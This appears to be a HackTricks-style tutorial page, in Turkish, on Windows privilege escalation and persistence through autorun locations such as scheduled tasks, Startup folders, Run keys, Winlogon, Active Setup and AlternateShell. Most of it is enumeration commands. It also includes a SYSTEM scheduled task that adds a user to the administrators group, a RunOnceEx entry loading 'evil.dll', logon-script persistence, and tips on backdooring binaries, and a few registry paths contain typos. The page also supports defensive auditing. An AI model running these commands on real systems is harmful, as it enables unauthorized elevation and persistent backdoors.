# Autoruns ile Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** programları **başlangıçta** çalıştırmak için kullanılabilir. Başlangıçta çalışacak şekilde programlanmış ikilileri görmek için:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zamanlanmış Görevler

**Tasks** belirli bir frekansta çalışacak şekilde zamanlanabilir. Hangi binary’lerin çalışması için zamanlandığını görmek için:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Klasörler

**Startup folders** içinde bulunan tüm binary’ler başlangıçta çalıştırılacaktır. Yaygın startup klasörleri aşağıda listelenenlerdir, ancak startup klasörü registry içinde belirtilir. [Bunun nerede olduğunu öğrenmek için bunu okuyun.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* açıkları (WinRAR’da 7.13 öncesinde istismar edilen – CVE-2025-8088 gibi) **decompression sırasında payload’ları doğrudan bu Startup klasörlerinin içine bırakmak** için kullanılabilir; bu da bir sonraki user logon’da code execution ile sonuçlanır.  Bu tekniğin derinlemesine incelemesi için bkz:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** registry girdisi, 64-bit Windows sürümü kullandığınızı belirtir. Operating system bu key’i, 64-bit Windows sürümlerinde çalışan 32-bit applications için HKEY_LOCAL_MACHINE\SOFTWARE’nin ayrı bir görünümünü göstermek amacıyla kullanır.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys known as **Run** and **RunOnce** are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista ve sonraki sürümlerde, **Run** ve **RunOnce** registry keys otomatik olarak oluşturulmaz. Bu key’lerdeki girdiler programları doğrudan başlatabilir veya bunları dependency olarak belirtebilir. Örneğin, logon sırasında bir DLL file yüklemek için, **RunOnceEx** registry key’i ile birlikte bir "Depend" key kullanılabilir. Bu, sistem start-up sırasında "C:\temp\evil.dll" çalıştırmak için bir registry girdisi eklenerek gösterilmektedir:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Eğer **HKLM** içindeki belirtilen registry’lerden herhangi birinin içine yazabiliyorsan, farklı bir kullanıcı giriş yaptığında yetkilerini yükseltebilirsin.

> [!TIP]
> **Exploit 2**: Eğer **HKLM** içindeki herhangi bir registry’de belirtilen binary’lerden herhangi birinin üzerine yazabiliyorsan, farklı bir kullanıcı giriş yaptığında o binary’yi bir backdoor ile değiştirebilir ve yetkilerini yükseltebilirsin.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** klasörüne yerleştirilen kısayollar, kullanıcı logon olduğunda veya sistem yeniden başlatıldığında hizmetleri ya da uygulamaları otomatik olarak başlatır. **Startup** klasörünün konumu, hem **Local Machine** hem de **Current User** kapsamları için registry içinde tanımlıdır. Bu, belirtilen bu **Startup** konumlarına eklenen herhangi bir kısayolun, bağlı olduğu hizmetin ya da programın logon veya reboot sürecinden sonra başlamasını sağlayacağı anlamına gelir; bu da programları otomatik çalışacak şekilde zamanlamak için basit bir yöntemdir.

> [!TIP]
> Eğer **HKLM** altındaki herhangi bir \[User] Shell Folder üzerine yazabiliyorsanız, onu sizin kontrol ettiğiniz bir klasöre yönlendirebilir ve bir backdoor yerleştirebilirsiniz; bu backdoor, bir kullanıcı sisteme her giriş yaptığında çalıştırılır ve privileges yükseltir.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Bu kullanıcıya özel registry değeri, o kullanıcının oturum açtığında çalıştırılan bir script veya command’e işaret edebilir. Bu, esas olarak bir **persistence** primitive’idir çünkü yalnızca etkilenen user bağlamında çalışır, ancak post-exploitation ve autoruns incelemeleri sırasında yine de kontrol etmeye değerdir.

> [!TIP]
> Eğer bu değeri mevcut user için yazabiliyorsanız, admin rights gerektirmeden bir sonraki interactive logon’da execution’ı yeniden tetikleyebilirsiniz. Eğer bunu başka bir user hive için yazabiliyorsanız, o user oturum açtığında code execution elde edebilirsiniz.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notlar:

- Hedef kullanıcının zaten okuyabildiği `.bat`, `.cmd`, `.ps1` veya diğer launcher dosyaları için tam path'leri tercih edin.
- Bu, değer kaldırılana kadar logoff/reboot sonrası da devam eder.
- `HKLM\...\Run`’dan farklı olarak, bu tek başına elevation vermez; bu user-scope persistence'tır.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Genellikle, **Userinit** key'i **userinit.exe** olarak ayarlanır. Ancak, bu key değiştirilirse, belirtilen executable da user logon sırasında **Winlogon** tarafından başlatılır. Benzer şekilde, **Shell** key'inin **explorer.exe**'yi göstermesi amaçlanır; bu da Windows için default shell'dir.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Eğer registry değerini veya binary dosyasını overwrite edebiliyorsanız, yetkileri yükseltebilirsiniz.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** key'ini kontrol edin.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Safe Mode Command Prompt'u Değiştirme

Windows Registry içinde `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` altında, varsayılan olarak `cmd.exe` olarak ayarlanmış bir **`AlternateShell`** değeri vardır. Bu, başlangıç sırasında ("Safe Mode with Command Prompt" seçeneğini F8'e basarak seçtiğinizde) `cmd.exe` kullanıldığı anlamına gelir. Ancak, bilgisayarınızı F8'e basıp bunu manuel olarak seçmeye gerek kalmadan bu modda otomatik olarak başlayacak şekilde ayarlamak mümkündür.

"Safe Mode with Command Prompt" modunda otomatik başlangıç için bir boot seçeneği oluşturma adımları:

1. `boot.ini` dosyasının özniteliklerini değiştirerek read-only, system ve hidden bayraklarını kaldırın: `attrib c:\boot.ini -r -s -h`
2. Düzenlemek için `boot.ini` dosyasını açın.
3. Şuna benzer bir satır ekleyin: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` üzerindeki değişiklikleri kaydedin.
5. Orijinal dosya özniteliklerini tekrar uygulayın: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key'ini değiştirmek, özelleştirilmiş bir command shell kurulmasına izin verir ve bu da yetkisiz erişim için kullanılabilir.
- **Exploit 2 (PATH Write Permissions):** Sistem **PATH** değişkeninin herhangi bir kısmına, özellikle `C:\Windows\system32` öncesine write permissions sahibi olmak, özel bir `cmd.exe` çalıştırmanıza izin verir; bu da sistem Safe Mode'da başlatılırsa bir backdoor olabilir.
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini` için yazma erişimi, otomatik Safe Mode başlangıcını etkinleştirir ve bir sonraki reboot'ta yetkisiz erişimi kolaylaştırır.

Mevcut **AlternateShell** ayarını kontrol etmek için şu komutları kullanın:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup, Windows’te **masaüstü ortamı tam olarak yüklenmeden önce başlayan** bir özelliktir. Belirli komutların yürütülmesine öncelik verir ve bu komutlar kullanıcı oturumu açma işlemi devam etmeden önce tamamlanmalıdır. Bu süreç, Run veya RunOnce registry bölümlerindekiler gibi diğer başlangıç girdileri tetiklenmeden önce bile gerçekleşir.

Active Setup şu registry anahtarları üzerinden yönetilir:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Bu anahtarlar içinde, her biri belirli bir bileşene karşılık gelen çeşitli alt anahtarlar bulunur. Özellikle dikkat çeken anahtar değerler şunlardır:

- **IsInstalled:**
- `0` bileşenin komutunun çalışmayacağını belirtir.
- `1` komutun her kullanıcı için bir kez çalışacağını belirtir; bu, `IsInstalled` değeri eksikse varsayılan davranıştır.
- **StubPath:** Active Setup tarafından yürütülecek komutu tanımlar. `notepad` başlatmak gibi geçerli herhangi bir komut satırı olabilir.

**Security Insights:**

- **`IsInstalled`** değeri `"1"` olarak ayarlanmış bir anahtarı, belirli bir **`StubPath`** ile değiştirmek veya bu anahtara yazmak, yetkisiz komut yürütmeye yol açabilir ve potansiyel olarak privilege escalation için kullanılabilir.
- Herhangi bir **`StubPath`** değerinde referans verilen binary dosyasını değiştirmek de, yeterli izin varsa, privilege escalation sağlayabilir.

**StubPath** yapılandırmalarını Active Setup bileşenleri arasında incelemek için şu komutlar kullanılabilir:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Browser Helper Objects (BHOs) Genel Bakış

Browser Helper Objects (BHOs), Microsoft Internet Explorer’a ekstra özellikler ekleyen DLL modülleridir. Her başlangıçta Internet Explorer ve Windows Explorer içine yüklenirler. Ancak, **NoExplorer** anahtarı 1 olarak ayarlanarak çalışmaları engellenebilir; bu da Windows Explorer örnekleriyle yüklenmelerini önler.

BHOs, Internet Explorer 11 üzerinden Windows 10 ile uyumludur, ancak Windows’un yeni sürümlerindeki varsayılan tarayıcı olan Microsoft Edge tarafından desteklenmez.

Sistemde kayıtlı BHOs’ları incelemek için aşağıdaki registry anahtarlarını kontrol edebilirsiniz:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Her BHO, registry’de benzersiz bir tanımlayıcı olarak görev yapan **CLSID** ile temsil edilir. Her CLSID hakkında ayrıntılı bilgi `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` altında bulunabilir.

Registry’de BHOs sorgulamak için şu komutlar kullanılabilir:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Registry, her dll için 1 yeni registry içerecek ve bu **CLSID** ile temsil edilecektir. CLSID bilgilerini `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` içinde bulabilirsiniz

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Unutmayın ki autoruns bulabileceğiniz tüm konumlar **zaten** [ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **tarafından aranır**. Ancak, **daha kapsamlı bir otomatik çalıştırılan** dosya listesi için systinternals'tan [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) kullanabilirsiniz:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Daha Fazla

**Daha fazla Autoruns benzeri registry'leri şurada bulun** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
